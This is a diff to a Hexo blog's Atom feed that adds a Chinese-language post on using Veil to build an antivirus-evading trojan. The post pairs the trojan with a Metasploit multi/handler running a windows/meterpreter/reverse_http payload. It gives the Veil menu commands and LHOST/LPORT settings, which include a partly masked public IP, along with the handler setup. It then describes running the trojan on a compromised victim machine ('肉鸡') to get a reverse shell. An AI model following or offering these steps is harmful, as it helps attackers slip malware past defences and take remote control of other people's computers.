@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hamal.cc/"/>
-  <updated>2018-05-20T15:43:45.228Z</updated>
+  <updated>2018-07-05T11:05:03.479Z</updated>
   <id>http://hamal.cc/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Veil过免杀</title>
+    <link href="http://hamal.cc/2018/07/Veil%E8%BF%87%E5%85%8D%E6%9D%80/"/>
+    <id>http://hamal.cc/2018/07/Veil过免杀/</id>
+    <published>2018-07-05T09:02:44.000Z</published>
+    <updated>2018-07-05T11:05:03.479Z</updated>
+    
+    <content type="html"><![CDATA[<p>最近一直研究Jboss反序列化漏洞做内网渗透，可以用veil过很多杀软。<strong><a id="more"></a></strong><br>安装veil是个大坑，安装了好久才成功。。。<br>配合msfconsole使用。</p><h3 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h3><p>启动veil<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br></pre></td></tr></table></figure></p><p><img src="/images/11.1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use 5</span><br></pre></td></tr></table></figure></p><p><img src="/images/11.2.png" alt=""><br>设置IP地址和端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 124.226.*.*</span><br><span class="line">set LPORT 11550</span><br><span class="line">generate</span><br></pre></td></tr></table></figure></p><p><img src="/images/11.3.png" alt=""><br>输入生成木马的名称<br><img src="/images/11.4.png" alt=""></p><h3 id="启动msfconsole"><a href="#启动msfconsole" class="headerlink" title="启动msfconsole"></a>启动msfconsole</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set LHOST 192.168.*.*       --我这是内网的，做了端口转发，所以IP地址不一样</span><br><span class="line">set LPORT 11550</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/images/11.5.png" alt=""><br>在肉鸡运行17.exe<br>反弹shell成功。<br><img src="/images/11.6.png" alt=""></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;最近一直研究Jboss反序列化漏洞做内网渗透，可以用veil过很多杀软。&lt;strong&gt;
+    
+    </summary>
+    
+      <category term="免杀" scheme="http://hamal.cc/categories/%E5%85%8D%E6%9D%80/"/>
+    
+    
+      <category term="远控" scheme="http://hamal.cc/tags/%E8%BF%9C%E6%8E%A7/"/>
+    
+  </entry>
   
   <entry>
     <title>Linux版永恒之蓝</title>
